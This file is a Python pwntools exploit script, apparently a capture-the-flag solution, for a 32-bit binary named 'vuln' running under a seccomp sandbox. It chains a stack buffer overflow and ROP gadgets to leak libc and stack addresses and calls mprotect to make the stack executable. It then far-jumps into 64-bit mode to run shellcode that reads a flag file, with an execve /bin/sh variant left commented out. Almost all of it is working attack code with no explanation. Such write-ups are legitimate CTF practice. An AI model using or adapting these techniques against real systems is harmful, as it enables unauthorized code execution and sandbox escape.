#!/usr/bin/env python
#coding:utf-8
from pwn import *
from pwn import shellcraft as sc
local=1
debug=0
filename="vuln"
libc="./libc.so.6"
ip="118.31.18.145"
port=20004
is_libc=1
is_ip=1
is_port=1
binary=ELF(filename)

if(is_libc==1):
    libc_elf=ELF(libc)
sys_offset=libc_elf.symbols['system']

p = process(argv=['./sandbox', './vuln'] ,env={'LD_PRELOAD': './libc.so.6'})

p_ret=0x08048421
p_ebp_ret=0x0804872b
ppp_ret=0x08048729
bss_addr=0x0804a040
leave_ret=0x08048538
payload='a'*48+'H'
# payload='aa'
payload+=p32(0x8048470)
payload+=p32(0x80485CB)
# payload+=p32(p_ret)
payload+=p32(0x804a018)
p.sendline(payload)
print p.recvline()
puts_addr=u32(p.recv(4))
# puts_addr=u32(p.recv(4).strip().ljust(4,'\x00'))
libc_base=puts_addr-libc_elf.symbols['puts']
environ_addr=libc_base+0x001b3dbc
write_addr=libc_base+libc_elf.symbols['write']
mprotect_addr=libc_base+libc_elf.symbols['mprotect']
log.info('binsh_addr '+hex(libc_base))
log.info("put_addr "+hex(puts_addr))
payload='a'*48+'H'
payload+=p32(write_addr)
payload+=p32(0x80485CB)
payload+=p32(1)+p32(environ_addr)+p32(4)
p.sendline(payload)
print p.recvline()
print p.recvline()
stack_leak=u32(p.recv(4))
stack=stack_leak&0xfffff000
log.info("stack leak "+hex(stack_leak))
log.info("stack addr "+hex(stack))
payload='a'*48+'H'
payload+=p32(mprotect_addr)
payload+=p32(0x80485CB)
payload+=p32(stack)+p32(0x1000)+p32(0x7)
p.sendline(payload)
print p.recv()
test='\x6a\x33\xe8\x00\x00\x00\x00\x83\x04\x24\x05\xcb'
shellcode='\x4d\x31\xc0\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\xbf\x00\x00\x80\x00\xb8\x38\x00\x00\x00\x0f\x05\x85\xc0\x75\xfe\x48\x31\xd2\x48\x31\xf6\x48\x8d\x3d\x09\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f\x05\x90\xcc\x2f\x62\x69\x6e\x2f\x73\x68'
context.arch='amd64'
context.bits=64
code = asm(shellcraft.amd64.linux.cat('./flag'))
payload='a'*48+'H'
payload+=p32(stack_leak)
payload+='\x90'*0x100
#payload+=test+shellcode
payload+=test+code
p.sendline(payload)
p.interactive()
